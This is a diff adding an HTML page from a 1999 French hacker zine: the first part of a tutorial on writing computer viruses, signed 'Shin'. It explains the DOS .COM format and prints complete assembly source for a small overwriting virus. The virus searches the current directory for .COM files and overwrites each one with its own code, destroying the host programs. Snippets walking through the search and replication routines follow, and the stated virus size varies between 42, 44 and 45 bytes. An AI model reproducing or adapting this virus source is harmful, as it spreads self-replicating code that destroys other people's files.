@@ -1,0 +1,249 @@
+<HTML>
+<head>
+</head>
+<script LANGUAGE="JavaScript">
+<!--
+function click() {
+if  (event.button==2) {
+alert ('The Last Click 2, Novembre 1999')
+}
+}
+ document.onmousedown=click
+//-->
+</script>
+
+<BODY background="back.gif" bgproperties="fixed" bgcolor=#000000 text=#C0C0C0 link=#000000 vlink=#000000 alink=#000000>
+<center><B>-La programmation des VIRUS-</B>
+<BR>1ère partie</center><BR><BR>
+Pour ceux qui n'y connaissent que dalle, je vais commencer par le commencement.<BR><BR>
+<B><u>*Qu'est ce qu'un virus?</u></B>
+<BR><BR>
+Un virus est un programme, le plus souvent (pour ne pas dire toujours)écrit
+ en assembleur, qui à la faculté de se reproduire une fois éxecuté.<BR>
+ En général, un virus se greffe sur un programme pour faciliter son activation et donc sa reproduction.Il
+ est conçu en règle générale pour passer inaperçu pendant sa phase de contamination et de réplication.<BR>
+ Un virus doit comporter 2 parties au moins:<BR>
+ -une lui permettant la recherche de fichiers à contaminer.<BR>
+ -une lui permettant de se reproduire.<BR><BR>
+ On peut ensuite rajouter d'autres routines (parties ou sous parties) telles qu'une
+ charge destructrice, un module de déclenchement, ...<BR><BR>
+ Bien évidemment, les virus existent depuis fort longtemps et étaient initiallement 
+ conçus pour infecter des fichiers de type .COM remontant à l'époque du CP/M.<BR>
+ Aujourd'hui, les virus s'attaquant aux .EXE de windows ou bien les macro Virus et autres virus
+ Worms... sont bien plus complexes dans leur écriture.
+ <BR>
+ Toutefois, certains mécanismes restent les mêmes.<BR><BR>
+ Pour débuter, nous étudierons des infecteurs de .COM tout simples.Essayez parallèlement à ce cour de trouver un bouquin 
+  sur l'assembleur.Vous aurez aussi besoin d'un assembleur.Je vous conseil TASM.<BR><BR>
+<hr>
+<B><U>Virus infecteur de COM tout simple.</U></B>
+<BR><BR>
+Il vaut mieux commencer avec un tout petit virus qui sera facile à comprendre et pas
+trop dangereux en cas d'échappée...<BR><BR>
+Il s'agit donc ici d'un simple infecteur de COM non résidant en mémoire qui comporte du code de
+ 80X86 non destructeur.<BR><BR>
+ On trouve parmis les infecteurs de COM ddes virus à recouvrement,des virus compagnons et des virus parasites,
+ mais nous verrons ça plus tard.
+ <BR>
+ Voyons déjà comment fonctionne un programme .COM.<BR><BR>
+ Au prompt du DOS,lorsque vous tapez le nom d'un programme .COM,le DOS recherche
+ un prog avec ce nom et l'extension .COM.Si il le trouve, il le charge en RAM et l'éxecute
+.
+Sinon, il cherche un EXE avec le même nom, puis un BAT.<BR>
+Les COM sont les plus simples des programmes pour le CPU.Leur format de segment est prédéfini dans le DOS.
+Un prog COM ne peut utiliser qu'un seul segment, c'est à dire 64Ko.Le COM se charge dans
+le segment à l'offset 100h, tandis que le DOS crée un préfixe de segment de programme de l'
+adresse 0 à 0FFh.
+<BR>
+C'est maintenant que notre virus intervient.<BR><BR>
+<B><U>1.Le virus à recouvrement.</U></B><BR><BR>
+C'est simple et c'est de la merde, parce qu'une fois qu'un programme est contaminé, il es détruit 
+car écrasé en partie, d'oùle nom de recouvrement.Il n'y a donc pas moyen de dissimuler un tel virus.Il fonctionne de la manière suivante:<BR><BR>
+-le virus est executé.<BR>
+-Il commence son éxecution dans le segment alloué par DOS à l'offset 100h.<BR>
+-Il recherche tous les fichiers portant un masque "*.COM" dans le répertoire courant.<BR>
+-Il ouvre chaque fichier trouvé et écrit son code au début.<BR>
+-Il rend le contrôle au DOS.
+<BR><BR>
+Le programme infecté est alors baisé, et quand on l'exécute, c'est en faite le code du virus qui 
+part.<BR>
+<BR>
+Voici la source d'un tel virus:<BR>
+<BR><p><hr>
+;Virus d'une cinquantaine d'octet qui réécrit <BR>
+;tous les COM d'un répertoire.<BR>
+<BR>
+.model small<BR>
+.code<BR>
+<BR>
+FNOM&nbsp;&nbsp;  EQU&nbsp;&nbsp;&nbsp;	9EH	 &nbsp;&nbsp;&nbsp;&nbsp;  	
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   	  ;Fonction de recherche,résultat.<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	
+&nbsp;&nbsp;  org	
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100H<BR>
+<BR>
+DEBUT:<BR>
+	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  mov	
+	  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ah,4EH			
+	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   	  ;Cherche les fichiers COM (SF)<BR>
+	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  mov	
+	&nbsp;&nbsp;&nbsp;&nbsp; dx,OFFSET COM_FILE<BR>
+	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  int
+	  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	21H<BR>
+	  <BR>
+CHERCHE:<BR>
+
+	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  jc	
+	 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;		  FAIT<BR>
+	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  mov	
+	 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	  ax,3D01H  
+	 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;		      ;Ouvre le fichier trouvé.<BR>
+	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  mov	
+	 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	  dx,FNOM<BR>
+	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  int	
+	 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  21H<BR>
+	  <BR>
+	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  xchg	
+	 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ax,bx     
+	          &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   ;Ecrit le virus dans le fichier.<BR>
+	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  mov	
+	   &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ax,40H<BR>
+	 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov	
+	  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cl,42    
+	               &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;Taille du virus.<BR>
+	  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov	
+	   &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dx,100H	
+	    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;			  ;Emplacement du virus.<BR>
+	 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int	
+	 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  21H<BR>
+	  <BR>
+	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  mov	
+	 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ah,3EH<BR>
+	 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int	
+	  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 21H	   
+	               &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  ;Ferme le fichier.<BR>
+	  <BR>
+	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  mov	
+	   &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ah,4FH<BR>
+	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  int	
+	 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  21H	           
+	 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;       ;Cherche un nouveau fichie COM.<BR>
+	 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp	
+	  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CHERCHE				  <BR>
+FAIT:<BR>
+	 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ret	
+	  					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  ;Rend le controle au DOS.<BR>
+COM_FILE  
+ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  Db	 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   '*.COM',0	  ;Chaine pour la recherche de COM.<BR>
+<BR>
+			END DEBUT<BR>
+	  <hr><BR>
+</p>
+ <p>Voilà.J'espère que vous y comprendrez quelquechose.
+ Voyons maintenant de plus prêt le fonctionnement de la routine de recherche.
+<BR><U><B>1.1Fonction de recherche</B></U><BR><BR>
+
+Le DOS conserve les  informations des fichiers dans 2 zones du disques (FAT).
+Le répertoire contient un champ de 32 octets qui contient les nom, date, taille, extension
+ et attributs des fichiers.La FAT est donc un plan du disque.Chaque disque contient 2 FAT.
+ La FAT et le répertoire Root sont toujours situé à la même place sur tous
+  les disques.
+  <BR>
+  Le DOS nous facilite bien le travail en recherchant et en ouvrant lui même
+  le fichier qu'on lui indique.Il suffit pour cela d'appeler la bonne interruption 
+  du DOS et de placer des valeurs correctes dans les registres du CPU.<BR><BR>
+Par exemple,<BR><BR>
+mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+dx,OFFSET FNOM<BR>
+xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+al,al<BR>
+mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ah,3DH<BR>
+int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+21H<BR>
+<BR>
+Cette routine ouvre un fichier  dont le nom est stocké dans FNOM.On a ici indiqué au DOS 
+de localiser et de préparer le fichier pour une lecture.<BR>
+Il en est de même pour les groupes de fichiers ou les répertoire.Il 
+ suffit de déclarer un répertoire ou un nom avec la syntaxe :<BR><BR>
+ Db &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 'Chemin\nom_de_fichier.ext'<BR><BR>
+ Bien sure, le caractère * et ? sont des jokers comme dans le prompt du DOS.
+ <BR><BR>
+ On va rechercher un premier fichier .COM puis ,si on en a un,on en cherche un second,...<BR>
+ On utilisera pour ça une première fonction de recherche, puis une seconde 
+ pour les fichier suivants.<BR>
+ La première routine ressemble à ça:<BR><BR>
+ CH_UN:<BR>
+ &nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dx,OFFSET FICHCOM
+ &nbsp;&nbsp;&nbsp;&nbsp;;qui pointe sur la chaine '*.COM'.
+ <BR>
+ &nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ah,4EH&nbsp;&nbsp;&nbsp;
+ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;Fonction premiere de recherche<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;21H&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;;appelle le DOS.<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;jc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PASFICH
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;si pas de fichier trouvé<BR><BR>
+TROUVE:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;Viens ici si fichier trouvé<BR><BR>
+FICHCOM&nbsp;&nbsp;&nbsp;Db&nbsp;&nbsp;'*.COM',0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;;Chaine ASCII <BR><BR>
+Si la recherche donne un résultat,la seconde recherche est appelée.Elle 
+est beaucoup plus simple car les paramètres on été fixés précédement.<BR><BR>
+&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;ax,4FH<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;21h<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;jc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PASFICH<BR>
+
+TROUVE2:
+<BR><BR>
+<B><U>1.2 Fonction de réplication.</U></B><BR><BR>
+
+On a vu comment le virus trouvait son programme hôte.Maintenant,son code doit ouvrir l'hôte puis écrire son code dans 
+le programme hôte, en l'écrasant puisqu'il s'agit d'un virus à recouvrement.
+<BR>
+Pour ouvrir l'hôte, le virus fait appel à la fonction 3Dh de l'interruption 21h.Les droits d'accès sont spécifiés dans le registre 
+al qui prend la valeur 1 (écriture seule).DX:DS pointe vers le fichier trouvé
+dont le nom est stocké dans FNOM à l'adresse 9EH.
+<BR>Le code est donc le suivant:<BR><BR>
+&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;ax,3D01H<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;dx OFFSET FNOM<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;&nbsp;&nbsp;21H<BR><BR>
+DOS renvoie ensuite un numéro d'identification du fichier dans ax qui devra être 
+placé en bx pour toutes les manipulations.On utilisera donc l'instruction "mov  bx,ax".
+<BR><BR>
+Ensuite, le virus appelle la fonction 40H de int 21h pour copier son code.C'est ds:dx qui pinte à l'endroit où les données seront écrites.
+Ici, la position est ds:100h puisque le code s'écrit au début du fichier (recouvrement).
+C'est ici cx porte le nombre d'octets à écrire, et dx pointe vers les données à écrire.
+on obtient le code suivant:<BR><BR>
+&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;bx,ax<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;dx,100h<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;cx,44<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;ah,40h<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;21h<BR><BR>
+<BR>
+Vous remarquez que ce code est très simple,aussi bien dans sa tructure que dans son
+ éxécution.Evidement, il n'est pas très performant,mais il ne fait que 45 octets, ce qui est très peu.
+ Le principale défaut de ce type de virus ( recouvrement ) tient dans le fait qu'il détruit tout ce qu'il infecte
+  et ne peut donc pas passer inaperçu bien longtemps.<BR><BR>
+  
+  Je vous laisse cojiter la dessus pour la première partie.Si jamais vous exécutez ce virus, vous n'avez qu'à lancer les programmes 
+  du même répertoire pour savoir s'ils sont contaminés.Vous n'avez qu'a les effacer puis les remplacer par une sauvegarde
+  pour récuperer un répertoire sain.
+  <BR><BR>
+  La prochaine partie sera consacrée aux virus compagnons simples infecteurs 
+  de .COM
+  
+  <BR><BR><BR>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-=Shin=-
+
+</BODY>
+</HTML>
